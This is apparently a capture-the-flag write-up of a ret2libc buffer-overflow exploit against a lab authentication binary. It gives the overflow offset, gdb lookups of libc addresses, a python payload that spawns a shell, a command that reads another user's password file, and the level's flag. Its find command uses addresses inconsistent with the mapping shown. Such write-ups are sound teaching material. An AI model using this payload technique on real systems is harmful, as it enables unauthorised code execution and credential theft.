
# Ret2libc again

## Program summary

This level involves exploiting a program emulating an authentication system.
The program verifies the username and password using specific functions such as **`verify_user_name()`** and **`verify_user_pass()`**.  The one that processes the username leaves the verification data visible, the username is **dat_wil**, this data is stored at address **`0x80486a8`**.

## Vulnerability

The program's vulnerability lies in the second **`fgets()`** function.
```
0x8048574 <main+164>    call   0x8048370 <fgets@plt>
```
By injecting an offset pattern we can calculate the exact distance between the buffer and the location of the saved **`$RIP / $EIP`**, and we can see that we can overwrite this memory location. 

## Attack design

To successfully exploit the vulnerability, we’ll use a **ret2libc**, you need to perform the following steps in order to achieve this :

1. Get Offset
> Offset pattern: LAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

`Program received signal SIGSEGV, Segmentation fault. 0x37634136 in ?? ()`

Our offset is therefore 80 Bytes according to the **0x37634136** value (I did this manipulation with an Buffer overflow pattern generator).

3. Retrieve the **`system()`** address :
```c
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

4. Retrieve **`exit()`** address :
```c
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
```

5. Find **`"/bin/sh"`** string address in libc-2.15.so using **`find`** command :
```
(gdb) info proc map
process 1865
Mapped address spaces:

Start Addr   End Addr       Size     Offset objfile
...
0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
...

(gdb) find 0x7ffff7a1c000,0x7ffff7bd2000,"/bin/sh"
0xf7f897ec
1 pattern found.
```

This payload will allow us to exploit the flaw present here :

```c
python -c 'print "dat_wil\n"+"B"*80+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"' > /tmp/boom
cat /home/users/level02/.pass
```

> Flag : `PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv`
